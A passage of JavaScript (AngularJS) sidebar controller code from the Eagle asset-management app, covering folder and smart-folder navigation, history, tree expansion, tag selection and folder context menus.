                'has-childred': smartFolder.children && smartFolder.children.length > 0,
                'empty-node': !smartFolder.children || smartFolder.children.length == 0,
                'first': smartFolder.styles && smartFolder.styles.first,
                'last': smartFolder.styles && smartFolder.styles.last,
            };
            result['icon-' + smartFolder.icon] = true;
			let parent = $scope.smartFolderMappings[smartFolder.parent];
			if (parent) {
				result[`parent-color-${parent?.iconColor}`] = true;
			}
            return result;
        };

        $scope.getFolderFullPath = function (folder) {
            if (folder) {
                if (folder.parent) {
                    try {
                        var ancestors = getAncestorFolders(folder, []);
                        ancestors.unshift(folder);
                        var names = ancestors.reverse().map(function (folder) {
                            return folder.name || "";
                        });
                        var namePath = names.join(" / ");
                        return namePath;
                    }
                    catch (err) {
                        return "";
                    }
                }
                else {
                    return folder.name || "";
                }
            }
            return "";
        };

        $scope.openFolderFullPathContextMenu = (event, folder) => {
            if (!folder) return;
            if (folder.parent) {
                try {
                    let items = [];
                    let ancestors = getAncestorFolders(folder, []);
                    ancestors.unshift(folder);
                    ancestors.forEach(function (f) {
                        items.push({
                            label: f.name,
                            checked: f === folder,
                            click: () => {
                                $scope.openFolder(f);
                                $scope.$evalAsync();
                            }
                        });
                    });
                    ContextMenu.open({
                        items: items,
                        showSearch: false,
                    });
                }
                catch (err) { }
            }
        };

        $scope.openParentFolder = function () {
            if ($scope.currentFolder && $scope.currentFolder.parent) {
                $scope.openFolder($scope.folderMappings[$scope.currentFolder.parent]);
            }
        };

        var openFolderTimeout;
        $scope.openFolder = function(fd, ignoreHistory, currentId, ignoreReload, focus) {
            const folder = $scope.folderMappings[fd?.id];

            if (!folder) return;
            if ($scope.currentFolder === folder && ($scope.allData.length > 0 || $scope.subFolders.length > 0) && eagle.filter.filterRules.color.value == undefined &&
                eagle.filter.filterRules.import.type == 'undefined' && $scope.currentId === currentId
            ) {
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }
                return;
            }

            ScrollbarSaver.saveScrollPosition();

            if ($scope.currentFolder) { $scope.currentFolder.editable = false; }
            if ($scope.currentSmartFolder) { $scope.currentSmartFolder.editable = false; }

            $scope.currentSmartFolder = undefined;
            $rootScope.currentFocus = focus || "sidebar";
            $scope.resetPage();
            $scope.viewMode = undefined;
            $scope.currentId = currentId || "folder-" + folder.id;
            $scope.currentFolderPath = $scope.getFolderFullPath(folder);

            if ($scope.currentFolder != folder) {
                $scope.currentFolder = folder;
                $scope.currentFolderChildren = getChildFoldersMap(folder);
            }

			if (localStorage[`eagle.list.layout.${$scope.currentFolder.id}`]) {
                if ($scope.layout !== localStorage[`eagle.list.layout.${$scope.currentFolder.id}`]) {
                    $scope.switchLayout(localStorage[`eagle.list.layout.${$scope.currentFolder.id}`]);
                }
			}

            if (!currentId || currentId.indexOf("quickaccess-") === -1) {
	            var ancestors = getAncestorFolders(folder, []);
	            if (ancestors.length > 0) {
	                for (var i = 0; i < ancestors.length; i++) {
	                    $scope.expandFolder(ancestors[i]);
	                }
	            }
            }

            if (!ignoreHistory) {
                $scope.addNavigationHistory({
                    type: "folder",
                    value: folder,
                    page: $scope.page,
                    scrollTop: $("#box-container").scrollTop()
                });
            }

            var height = localStorage.getItem("eagle.list.thumbSize." + folder.id) || 150;
            height = parseInt(height);
            $scope.imageSize.height = parseInt(height / 5) * 5;
            updateListHeight($scope.imageSize.height);
            if (!ignoreReload) {
                ScrollbarSaver.restoreScrollPosition();
                $scope.reload();
            }
            else {
                $scope.rebindRefresh();
            }
            if ($scope.currentFolder) {
                setLastFolder($scope.currentFolder.id);
            }

            analytics.screenView('Folder');
        };

        var setViewMode = _.debounce(function setViewMode (viewMode) {
            if (!viewMode) return;
            localStorage.setItem(`eagle.viewMode.${$scope.rootDir}`, viewMode);
        }, 500);

        var setLastFolder = _.debounce(function setLastFolder (folderId) {
            if (!folderId) {
                localStorage.removeItem(`eagle.lastFolder.${$scope.rootDir}`);
            }
            else {
            	setViewMode("all");
                localStorage.setItem(`eagle.lastFolder.${$scope.rootDir}`, folderId);
            }
        }, 500);

        var setLastItem = _.debounce(function setLastItem (item) {
            if (item) {
                localStorage.setItem(`eagle.lastViewItem.${$scope.rootDir}`, item.id);
            	localStorage.setItem(`eagle.lastViewItemTime.${$scope.rootDir}`, Date.now());
            }
        }, 333);

        var openSmartFolderTimeout;
        $scope.openSmartFolder = function(smartFolder, ignoreHistory, currentId) {
            if (!smartFolder) return;
            if ($scope.currentSmartFolder === smartFolder && $scope.allData.length > 0 && eagle.filter.filterRules.color.value == undefined &&
                eagle.filter.filterRules.import.type == 'undefined' && $scope.currentId === currentId
            ) {
                if ($scope.isDetailMode) {
                    $scope.leaveDetailMode();
                }
                return;
            }

            ScrollbarSaver.saveScrollPosition();

            if ($scope.currentFolder) { $scope.currentFolder.editable = false; }
            if ($scope.currentSmartFolder) { $scope.currentSmartFolder.editable = false; }

            $scope.currentFolder = undefined;
            eagle.inspector.reset();
            $scope.currentFolderChildren = undefined;
            $rootScope.selectedSmartFoldersMappings = {};
            $rootScope.selectedSmartFolders = [];
            $rootScope.currentFocus = "sidebar";
            $scope.resetPage();
            $scope.viewMode = undefined;
            $scope.currentId = currentId || "smart-folder-" + smartFolder.id;

            if ($scope.currentSmartFolder != smartFolder) {
                $scope.currentSmartFolder = smartFolder;
            }

			if (localStorage[`eagle.list.layout.${$scope.currentSmartFolder.id}`]) {
				$scope.switchLayout(localStorage[`eagle.list.layout.${$scope.currentSmartFolder.id}`]); 
			}

            if (!currentId || currentId.indexOf("quickaccess-") === -1) {
	            var ancestors = getAncestorSmartFolders(smartFolder, []);
	            if (ancestors.length > 0) {
	                for (var i = 0; i < ancestors.length; i++) {
	                    $scope.expandSmartFolder(ancestors[i]);
	                }
	            }
            }

            if (!ignoreHistory) {
                $scope.addNavigationHistory({
                    type: "smartFolder",
                    value: smartFolder
                });
            }

            $timeout.cancel(openSmartFolderTimeout);
            openSmartFolderTimeout = $timeout(function() {
                $scope.imageSize.height = localStorage.getItem("eagle.list.thumbSize." + smartFolder.id) || 150;
                $scope.imageSize.height = parseInt($scope.imageSize.height);
                updateListHeight($scope.imageSize.height);
                ScrollbarSaver.restoreScrollPosition();
                $scope.reload();
                analytics.screenView('SmartFolder');

                if ($scope.currentSmartFolder) {
	                setLastFolder($scope.currentSmartFolder.id);
	            }

            }, 25);
        };

        $scope.addNavigationHistory = function(options) {
            if (options) {
                $scope.navigationHistory.length = $scope.navigationHistoryIndex + 1;
                $scope.navigationHistory.push(options);
                $scope.navigationHistoryIndex = $scope.navigationHistory.length - 1;
            }
        };

        $scope.nextHistory = function() {
            if ($scope.navigationHistoryIndex < $scope.navigationHistory.length - 1) {
                $scope.navigationHistoryIndex++;
                $scope.gotoHistory($scope.navigationHistoryIndex);
            }
        };

        $scope.prevHistory = function() {
            if ($scope.navigationHistoryIndex > 1) {
                $scope.navigationHistoryIndex--;
                $scope.gotoHistory($scope.navigationHistoryIndex);
            }
        };

        $scope.gotoHistory = function(index) {
            if (!$scope.navigationHistory[index]) return;
            var history = $scope.navigationHistory[index];
            switch (history.type) {
                case 'all':
                    $scope.openAll(true);
                    break;
                case 'unfiled':
                    $scope.openUnfiled(true);
                    break;
                case 'untagged':
                    $scope.openUntagged(true);
                    break;
                case 'random':
                    $scope.openRandom(true);
                    break;
                case 'recent':
                    $scope.openRecent(true);
                    break;
                case 'alltags':
                    $scope.openAllTags(true);
                    break;
                case 'trash':
                    $scope.openTrash(true);
                    break;
                case 'folder':
                    if ($scope.folderMappings[history.value.id] === undefined) {
                        $scope.navigationHistory.splice(index, 1);
                        $scope.gotoHistory(index);
                    }
                    else {
                        $scope.openFolder(history.value, true);
                        $scope.changeSidebarIndex(history.value);
                    }
                    break;
                case 'smartFolder':
                    if ($scope.smartFolderMappings[history.value.id] === undefined) {
                        $scope.navigationHistory.splice(index, 1);
                        $scope.gotoHistory(index);
                    }
                    else {
                        $scope.openSmartFolder(history.value, true);
                        $scope.changeSidebarIndex(history.value);
                    }
                    break;
                case 'tag':
                    $scope.openTag(history.value, true);
                    break;
                case 'color':
                    $scope.filterWithColor(history.value, true);
                    break;
            }
        };

        $scope.openFolderExpandContextMenu = (event, folder) => {
            event.stopPropagation();
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__("Context.Expand.Folder"),
                        icon: 'ic-expand.svg',
                        click: () => {
                            $scope.toggleSelectFolder(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__("Context.Expand.SameLevel.Folders"),
                        icon: 'ic-expand-same.svg',
                        click: () => {
                            $scope.toggleCurrentLevelFolders(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__("Context.Expand.All.Folders"),
                        icon: 'ic-expand-all.svg',
                        click: () => {
                            $scope.toggleAllFolderExpand(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                ],
                showSearch: false,
                onOpened: () => {
                    folder.isSelected = true;
                    $scope.$evalAsync();
                },
                onClosed: () => {
                    folder.isSelected = false;
                    $scope.$evalAsync();
                }
            });
        };

        $scope.openSmartFolderExpandContextMenu = function(event, smartFolder) {
            event.stopPropagation();
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__("Context.Expand.Folder"),
                        icon: 'ic-expand.svg',
                        click: () => {
                            $scope.toggleSelectSmartFolder(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__("Context.Expand.SameLevel.Folders"),
                        icon: 'ic-expand-same.svg',
                        click: () => {
                            $scope.toggleCurrentLevelSmartFolders(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__("Context.Expand.All.Folders"),
                        icon: 'ic-expand-all.svg',
                        click: () => {
                            $scope.toggleAllSmartFolderExpand(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                ],
                showSearch: false,
                onOpened: () => {
                    smartFolder.isSelected = true;
                    $scope.$evalAsync();
                },
                onClosed: () => {
                    smartFolder.isSelected = false;
                    $scope.$evalAsync();
                }
            });
        };

        $scope.toggleSmartFolderExpand = function(event, smartFolder) {

            event.stopPropagation();

            if (!smartFolder.children || smartFolder.children.length == 0) return;

            // 如果用户点击了 ⌘ + alt，展开/收起所有层级
            if (event.altKey && (event.metaKey || event.ctrlKey)) {
                var expand = !smartFolder.isExpand;
                toggleAllSmartFolders($scope.smartFolders, expand);
            }
            // 如果用户点击 ⌘，展开/收起第一层
            else if (event.metaKey || event.ctrlKey) {
                var expand = !smartFolder.isExpand;
                var parent = $scope.smartFolderMappings[smartFolder.parent];
                var smartFolders = $scope.smartFolders;
                if (parent && parent.children) {
                    smartFolders = parent.children;
                }
                toggleCurrentLevelSmartFolders(smartFolders, expand);
            }
            else if (event.altKey) {
                var expand = !smartFolder.isExpand;
                var smartFolders = smartFolder.children;
                smartFolder.isExpand = expand;
                toggleCurrentLevelSmartFolders(smartFolders, expand);
            }
            else {
	            smartFolder.isExpand = !smartFolder.isExpand;
	            localStorage.setItem("eagle.sidebar.smartFolder.expand." + smartFolder.id, smartFolder.isExpand);
	        }

            $scope.updateSidebarList();

        };

        $scope.toggleFolderExpand = function(event, folder) {

            event.stopPropagation();

            if (!folder.children || folder.children.length ==0) return;

            // 如果用户点击了 ⌘ + alt，展开/收起所有层级
            if (event.altKey && (event.metaKey || event.ctrlKey)) {
                var expand = !folder.isExpand;
                toggleAllFolders($scope.folders, expand);
            }
            // 如果用户点击 ⌘，展开/收起第一层
            else if (event.metaKey || event.ctrlKey) {
                var expand = !folder.isExpand;
                var parent = $scope.folderMappings[folder.parent];
                var folders = $scope.folders;
                if (parent && parent.children) {
                    folders = parent.children;
                }
                toggleCurrentLevelFolders(folders, expand);
            }
            else if (event.altKey) {
                var expand = !folder.isExpand;
                var folders = folder.children;
                folder.isExpand = expand;
                toggleCurrentLevelFolders(folders, expand);
            }
            else {
                folder.isExpand = !folder.isExpand;
                localStorage.setItem("eagle.sidebar.folder.expand." + folder.id, folder.isExpand);
            }
            $scope.updateSidebarList();
        };

        function toggleAllFolders (folders, isExpand) {
            eagle.utils.tree.walk(folders, 'children', function(f, parent) {
                if (f.isExpand !== isExpand) {
                    f.isExpand = isExpand;
                    localStorage.setItem("eagle.sidebar.folder.expand." + f.id, f.isExpand);
                }
            });
            $scope.updateSidebarList();
        };

        function toggleCurrentLevelFolders (folders, isExpand) {
            folders.forEach(function (f) {
                if (f.isExpand !== isExpand) {
                    f.isExpand = isExpand;
                    localStorage.setItem("eagle.sidebar.folder.expand." + f.id, f.isExpand);
                }
            });
            $scope.updateSidebarList();
        };

        $scope.toggleSelectFolder = function (event, folder) {
            var expand = !folder.isExpand;
            var folders = folder.children;
            folder.isExpand = expand;
            toggleCurrentLevelFolders(folders, expand);
        };

        $scope.toggleCurrentLevelFolders = function (event, folder) {
            var expand = !folder.isExpand;
            var parent = $scope.folderMappings[folder.parent];
            var folders = $scope.folders;
            if (parent && parent.children) {
                folders = parent.children;
            }
            toggleCurrentLevelFolders(folders, expand);
        };

        $scope.toggleAllFolderExpand = function (event, selectedFolder) {
            var folder = selectedFolder || $scope.currentFolder;
            if ($scope.folders && $scope.folders.length > 0) {
                var expand = !$scope.folders[0].isExpand;
                if (folder) {
                    setTimeout(function() {  $scope.changeSidebarIndex(folder); $scope.$evalAsync(); }, 100);
                    if (folder.parent) {
                        var parent = $scope.folderMappings[folder.parent];
                        if (parent) {
                            expand = !parent.isExpand;
                        }
                    }
                }
                if (!expand) $scope.sidebarIndex = 0;
                toggleAllFolders($scope.folders, expand);
                $scope.updateSidebarList();
            }
        };

        $scope.toggleSelectSmartFolder = function (event, smartFolder) {
            var expand = !smartFolder.isExpand;
            var smartFolders = smartFolder.children;
            smartFolder.isExpand = expand;
            toggleCurrentLevelSmartFolders(smartFolders, expand);
        };

        $scope.toggleCurrentLevelSmartFolders = function (event, smartFolder) {
            var expand = !smartFolder.isExpand;
            var parent = $scope.smartFolderMappings[smartFolder.parent];
            var smartFolders = $scope.smartFolders;
            if (parent && parent.children) {
                smartFolders = parent.children;
            }
            toggleCurrentLevelSmartFolders(smartFolders, expand);
        };

        $scope.toggleAllSmartFolderExpand = function (event, selectedSmartFolder) {
            var smartFolder = selectedSmartFolder || $scope.currentSmartFolder;
            if ($scope.smartFolders && $scope.smartFolders.length > 0) {
                var expand = !$scope.smartFolders[0].isExpand;
                if (smartFolder) {
                    setTimeout(function() {  $scope.changeSidebarIndex(smartFolder); $scope.$evalAsync(); }, 100);
                    if (smartFolder.parent) {
                        var parent = $scope.smartFolderMappings[smartFolder.parent];
                        if (parent) {
                            expand = !parent.isExpand;
                        }
                    }
                }
                if (!expand) $scope.sidebarIndex = 0;
                toggleAllSmartFolders($scope.smartFolders, expand);
                $scope.updateSidebarList();
            }
        };

        $scope.toggleAllFolders = function () {
        	if ($scope.currentSmartFolder) {
        		$scope.toggleAllSmartFolderExpand();
        	}
        	else {
        		$scope.toggleAllFolderExpand();	
        	}
        };

        function toggleAllSmartFolders (smartFolders, isExpand) {
            eagle.utils.tree.walk(smartFolders, 'children', function(f, parent) {
                if (f.isExpand !== isExpand) {
                    f.isExpand = isExpand;
                    localStorage.setItem("eagle.sidebar.smartFolder.expand." + f.id, f.isExpand);
                }
            });
            $scope.updateSidebarList();
        };

        function toggleCurrentLevelSmartFolders (smartFolders, isExpand) {
            smartFolders.forEach(function (f) {
                if (f.isExpand !== isExpand) {
                    f.isExpand = isExpand;
                    localStorage.setItem("eagle.sidebar.smartFolder.expand." + f.id, f.isExpand);
                }
            });
            $scope.updateSidebarList();
        };

        $scope.excludeExistTags = function (tag) {
            if (!$scope.currentTagGroup) return true;
            try {
                var currentGroupID = $scope.currentTagGroup.id;
                if (tag.groups && tag.groups.length > 0 && tag.groups.indexOf(currentGroupID) > -1) {
                    return false;
                }
                return true;
            }
            catch (err) {
                return true;
            }
        };

        $scope.getSelectedTags = function () {
            if (!$scope.selectedTags) return [];
            return Object.keys($scope.selectedTags);
        };

        $scope.selectTag = function (event, tag) {

            event.stopPropagation();

            if (event.button !== 0 && $scope.selectedTags[tag.name]) return;

            $rootScope.currentFocus = 'content';

            // Shift 多選
            if (event.shiftKey) {
                
                let selectedTags = [];
                let found = 0;

                TagManager.tagsResult.display.forEach((item, index) => {
                    if (item.type === "row") {
                        const tags = item.tags;
                        tags.forEach((tagName) => {
                            if (tagName === $scope.lastSelectedTag || tagName === tag.name) {
                                found++;
                                selectedTags.push(tagName);
                                return;
                            }
                            if (found === 2) {
                                return;
                            }
                            if (found === 1) {
                                selectedTags.push(tagName);
                            }
                        });
                    }
                });

                selectedTags.forEach((tagName) => {
                    if ($scope.selectedTags[tagName]) return;
                    $scope.selectedTags[tagName] = true;
                });
                
                $scope.lastSelectedTag = tag.name;
                return;
            }

            if (event.metaKey || event.ctrlKey) {
                if ($scope.selectedTags[tag.name]) {
                    delete $scope.selectedTags[tag.name];
                }
                else {
                    $scope.selectedTags[tag.name] = true;
                }
                $scope.lastSelectedTag = tag.name;
            }
            else {
                $scope.selectedTags = {};
                $scope.selectedTags[tag.name] = true;
                $scope.lastSelectedTag = tag.name;
            }
        };

        $scope.openTag = function(tag, ignoreHistory) {
            $scope.resetPage();
            $rootScope.currentFocus = "content";
            $scope.currentFolder = undefined;
            $scope.currentFolderChildren = undefined;
            TagManager.filterWithTags([tag]);
        };

        $scope.sortableOptions = {
            animation: 200,
            distance: 10,
            disabled: false,
            update: function(e, ui) {
                $timeout(function () {
                    $scope.saveFolder();
                }, 500);
            },
        };

        $scope.subFolderSortableOptions = {
            distance: 10,
            disabled: false,
            tolerance: "pointer",
			helper : 'clone',
            update: function (e, ui) {
                $scope.updateSidebarList();
                $timeout(function () {
                    $scope.saveFolder();
                }, 500);
            },
        };

        
        $scope.tagGroupSortableOptions = {
            animation: 200,
            distance: 10,
            disabled: false,
			helper : 'clone',
            stop: function(e, ui) {
                $scope.saveFolder();
                $scope.$evalAsync();
                tagRectSelecting = false;
                try { electronLog && electronLog.info(`[app] Sort tag groups`); } catch (err) {};
                $timeout(function () {
                    TagManager.calculateTags();
                }, 500);
            },
            update: function () {

            }
        };

        $scope.nextFolder = function() {
        };

        $scope.hoverShowSidebar = function ($event) {
            $event && $event.stopPropagation();
            if ($scope.isHideSidebar) {
                if (!$("#sidebar").hasClass("hover-show")) {
                    $("#sidebar").addClass("slide-in");
                    $("#sidebar").addClass("hover-show");
                }
            }
        };

        $scope.hoverHideSidebar = function ($event) {
            $event && $event.stopPropagation();
            if ($("#sidebar").hasClass("hover-show")) {
                $("#sidebar").removeClass("hover-show");
                setTimeout(() => {
                    $("#sidebar").removeClass("slide-in");
                }, 300);
            }
        };

        $scope.sidebarFocus = function($event) {
            $event && $event.stopPropagation();
            $rootScope.currentFocus = "sidebar";
        };

        $scope.openFolderContextMenu = (event, folder) => {

            if (event?.target?.tagName === 'INPUT') return;

            const disabled = !!folder.password && !folder.isUnLock;
            const isOpenQuickAccess = $rootScope.preferences.sidebar.quickAccess != 'false';
            const isAddedQuickAccess = QuickAccessManager.indexOf(folder) > -1;
            const isMultiple = $scope.selectedFoldersMappings[folder.id];
            const selectedFolders = $rootScope.selectedFolders;
        
            let items = null;
            let historyLibraryMenu = {};
        
            historyLibraryMenu.items = $bodyScope.getLibraryHistory().filter((history) => {
                var isCurrent = false;
                if ($bodyScope.libraryPath) {
                    isCurrent = path.normalize(history.path) == path.normalize($bodyScope.libraryPath);
                }
                return !isCurrent;
            }).map((history) => {
                return {
                    label: history.name,
                    keywords: i18n.__('context.image.addToLibrary') + ' library 資源庫',
                    accelerator: history.dir,
                    icon: 'ic-library-logo.svg',
                    click: () => {
                        const items = $bodyScope.getFolderImages(folder, true);
                        $rootScope.$broadcast("ADD_TO_LIBRARY", {
                            folder: folder,
                            items: items,
                            library: history
                        });
                        $scope.$evalAsync();
                    }
                }
            });
        
            if (isMultiple && selectedFolders.length > 1) {
        
                // 當前的排序方式
                const currentOrder = selectedFolders.reduce((prev, current) => {
                    return (prev?.orderBy === current?.orderBy) ? prev?.orderBy : undefined;
                });
        
                const currentOrderIncrease = selectedFolders.reduce((prev, current) => {
                    return (prev?.sortIncrease === current?.sortIncrease) ? prev?.sortIncrease : undefined;
                });
        
                let defaultOrderItem = {
                    checked: !currentOrder,
                    label: i18n.__('context.order.orderBy>default'),
                    icon: 'ic-order-by.svg',
                    click: () => {
                        $scope.setFoldersOrder(selectedFolders, undefined);
                    }
                };
        
                let orderItems = ['import', 'mtime', 'btime', 'name', 'ext', 'filesize', 'resolution', 'rating', 'duration', 'random'].map((order) => {
                    const uppercase = order?.toUpperCase();
                    return {
                        checked: currentOrder === uppercase,
                        label: i18n.__(`context.order.orderBy>${order}`),
                        keywords: order,
                        icon: `ic-order-by-${order}.svg`,
                        click: () => {
                            $scope.setFoldersOrder(selectedFolders, uppercase || undefined);
                        }
                    }
                });
        
                let increaseItems = [
                    {
                        checked: currentOrderIncrease === true,
                        label: i18n.__('context.order.orderBy>increase'),
                        icon: 'ic-order-by-increase.svg',
                        click: () => {
                            $scope.setFoldersSortIncrease(selectedFolders, true)
                        }
                    },
                    {
                        checked: currentOrderIncrease === false,
                        label: i18n.__('context.order.orderBy>decrease'),
                        icon: 'ic-order-by-decrease.svg',
                        click: () => {
                            $scope.setFoldersSortIncrease(selectedFolders, false)
                        }
                    },
                ];
        
                let orderByItems = [defaultOrderItem, ...orderItems, { role: 'separator' }, ...increaseItems];
        
                items = [
                    // 添加到最愛 / 從最愛移除
                    {
                        visible: isOpenQuickAccess && !isAddedQuickAccess,
                        label: i18n.__("context.folder.quickAccessAdd"),
                        keywords: '最愛 加入 快速存取 add quick access favorite',
                        icon: "ic-favorite-add.svg",
                        click: () => {
                            QuickAccessManager.addMultiple('folder', selectedFolders);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        visible: isOpenQuickAccess && isAddedQuickAccess,
                        label: i18n.__("context.folder.quickAccessRemove"),
                        keywords: '最愛 移除 快速存取 remove quick access favorite',
                        icon: "ic-favorite-remove.svg",
                        click: () => {
                            QuickAccessManager.removeMultiple('folder', selectedFolders);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        visible: isOpenQuickAccess,
                        role: 'separator'
                    },
                    // 移動文件夾
                    {
                        label: i18n.__('context.folder.moveFolder'),
                        keywords: 'move folder dir 資料夾 文件夾 移动',
                        icon: 'ic-folder-move.svg',
                        click: () => {
                            $scope.moveFolders(selectedFolders, folder);
                            $scope.$evalAsync();
                        }
                    },
                    // 批次命名
                    {
                        accelerator: (process.platform === 'win32') ? 'F2': 'CmdOrCtrl+R',
                        label: i18n.__('context.image.batchRename.msg1') + selectedFolders.length + i18n.__('context.image.batchRename.msg2'),
                        keywords: '重命名 重新命名 rename',
                        icon: 'ic-rename.svg',
                        click: () => {
                            $scope.batchRenameFolders(event);
                            $scope.$evalAsync();
                        }
                    },
                    // 修改排序
                    {
                        label: i18n.__('context.order.label.orderBy'),
                        icon: 'ic-order-by.svg',
                        submenu: {
                            items:orderByItems
                        }
                    },
                    // 導出
                    {
                        disabled: disabled,
                        icon: 'ic-export.svg',
                        label: i18n.__("context.folder.export"),
                        submenu: {
                            items: [
                                {
                                    disabled: disabled,
                                    label: i18n.__("context.folder.export>computer"),
                                    keywords: '導出 エクスポート 本地 export computer local',
                                    icon: 'ic-export-computer.svg',
                                    click: () => {
                                        $scope.folderExportAsFolder(event);
                                        $scope.$evalAsync();
                                    }
                                }
                            ]
                        }
                    },
                    {
                        role: 'separator'
                    },
                    // emoji
                    {
                        label: i18n.__('context.folder.icon'),
                        icon: 'ic-emoji.svg',
                        submenu: {
                            items: [{
                                role: 'emoji',
                                click: (emoji) => {
                                    $scope.changeSelectedFoldersIcon(event, emoji);
                                }
                            }]
                        }
                    },
                    // color
                    {
                        role: 'color',
                        click: (color) => {
                            $scope.changeSelectedFoldersColor(event, color);
                            $scope.$evalAsync();
                        }
                    },
                    // ---
                    // 刪除
                    {
                        role: 'separator'
                    },
                    {
                        accelerator: (process.platform === 'win32') ? 'Delete': 'CmdOrCtrl+⌫',
                        label: i18n.__("context.folder.remove"),
                        keywords: '資料夾 文件夾 刪除 移除 remove delete folder dir',
                        icon: 'ic-folder-remove.svg',
                        click: () => {
                            $scope.removeSelectedFolders();
                            $scope.$evalAsync();
                        }
                    },
                ];
            }
            else {
                items = [
                    // 新增資料夾
                    {
                        accelerator: $rootScope.preferences.shortcuts.keybinds['create.folder'] || 'CmdOrCtrl+Shift+N',
                        label: i18n.__('context.folder.newFolder'),
                        keywords: 'folder dir new create 資料夾 文件夾 新建 建立 新增 ',
                        icon: 'ic-folder-new-folder.svg',
                        click: () => {
                            $scope.newFolder(folder, false, true);
                            $scope.$evalAsync();
                        }
                    },
                    // 新增子資料夾
                    {
                        disabled: disabled,
                        accelerator: 'Alt+N',
                        label: i18n.__('context.folder.newSubFolder'),
                        keywords: 'sub folder dir new create 資料夾 文件夾 新建 建立 新增 子資料夾',
                        icon: 'ic-folder-new-sub-folder.svg',
                        click: () => {
                            $scope.newFolder(folder, true);
                            $scope.$evalAsync();
                        }
                    },
                    // 移動文件夾
                    {
                        label: i18n.__('context.folder.moveFolder'),
                        keywords: 'move folder dir 資料夾 文件夾 移动',
                        icon: 'ic-folder-move.svg',
                        click: () => {
                            $scope.moveFolders(selectedFolders, folder);
                            $scope.$evalAsync();
                        }
                    },
                    // ---
                    {
                        role: 'separator'
                    },
                    // 添加到最愛 / 從最愛移除
                    {
                        visible: isOpenQuickAccess && !isAddedQuickAccess,
                        label: i18n.__("context.folder.quickAccessAdd"),
                        keywords: '最愛 加入 快速存取 add quick access favorite',
                        icon: "ic-favorite-add.svg",
                        click: () => {
                            QuickAccessManager.add('folder', folder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        visible: isOpenQuickAccess && isAddedQuickAccess,
                        label: i18n.__("context.folder.quickAccessRemove"),
                        keywords: '最愛 移除 快速存取 remove quick access favorite',
                        icon: "ic-favorite-remove.svg",
                        click: () => {
                            QuickAccessManager.remove('folder', folder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        visible: isOpenQuickAccess,
                        role: 'separator'
                    },
                    // 重命名
                    {
                        accelerator: (process.platform === 'win32') ? 'F2': 'CmdOrCtrl+R',
                        label: i18n.__('context.folder.renameFolder'),
                        keywords: '重命名 重新命名 rename',
                        icon: 'ic-rename.svg',
                        click: () => {
                            $scope.renameFolder(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    // 複製連結
                    {
                        label: i18n.__('appmenu.edit>copyAsLink'),
                        keywords: '複製 連結 copy link',
                        icon: 'ic-folder-copy-link.svg',
                        click: () => {
                            $scope.copyFolderLink(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    // 自動標籤
                    {
                        accelerator: 'CmdOrCtrl+Shift+R',
                        label: i18n.__('context.folder.autoTagging'),
                        icon: 'ic-folder-auto-tag.svg',
                        disabled: disabled,
                        click: (event) => {
                            $scope.settingFolder(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    // 密碼保護
                    {
                        label: i18n.__('context.folder.password'),
                        icon: 'ic-password.svg',
                        submenu: {
                            items: [
                                {
                                    disabled: !!folder.password,
                                    label: i18n.__("context.folder.password>create"),
                                    click: () => {
                                        $scope.setFolderPassword(folder);
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: !folder.password,
                                    label: i18n.__("context.folder.password>change"),
                                    click: () => {
                                        $scope.changeFolderPassword(folder);
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: !folder.password,
                                    label: i18n.__("context.folder.password>reset"),
                                    click: () => {
                                        $scope.resetFolderPassword(folder);
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: !(!!folder.password && !!folder.isUnLock),
                                    label: i18n.__("context.folder.password>lock"),
                                    click: () => {
                                        $scope.lockFolder(event, folder);
                                        $scope.$evalAsync();
                                    }
                                }
                            ]
                        }
                    },
                    // ---
                    // 排序
                    {
                        label: i18n.__('context.folder.sortByTitle'),
                        icon: 'ic-order-by.svg',
                        submenu: {
                            items: [
                                {
                                    label: i18n.__('context.folder.sortByTitle>title') + `(${i18n.__('context.folder.sortByCurrentLevel')}) (A→Z)`,
                                    keywords: i18n.__('context.folder.sortByTitle'),
                                    click: () => {
                                        let folders = (folder.parent)? $scope.folderMappings[folder.parent].children : $scope.folders;
                                        $scope.reorderFolderByTitle(folders);
                                    }
                                },
                                {
                                    label: i18n.__('context.folder.sortByTitle>title') + `(${i18n.__('context.folder.sortByCurrentLevel')}) (Z→A)`,
                                    keywords: i18n.__('context.folder.sortByTitle'),
                                    click: () => {
                                        let folders = (folder.parent)? $scope.folderMappings[folder.parent].children : $scope.folders;
                                        $scope.reorderFolderByTitle(folders, true);
                                    }
                                },
                                {
                                    label: i18n.__('context.folder.sortByTitle>title') + `(${i18n.__('context.folder.sortByAllLevel')}) (A→Z)`,
                                    keywords: i18n.__('context.folder.sortByTitle'),
                                    click: () => {
                                        $scope.reorderAllFolderByTitle();
                                    }
                                },
                                {
                                    label: i18n.__('context.folder.sortByTitle>title') + `(${i18n.__('context.folder.sortByAllLevel')}) (Z→A)`,
                                    keywords: i18n.__('context.folder.sortByTitle'),
                                    click: () => {
                                        $scope.reorderAllFolderByTitle(true);
                                    }
                                },
                            ]
                        }
                    },
                    {
                        role: 'separator'
                    },
                    {
                        label: i18n.__("Context.Expand.Folder"),
                        icon: 'ic-expand.svg',
                        click: () => {
                            $scope.toggleSelectFolder(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__("Context.Expand.SameLevel.Folders"),
                        icon: 'ic-expand-same.svg',
                        click: () => {
                            $scope.toggleCurrentLevelFolders(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        accelerator: '/',
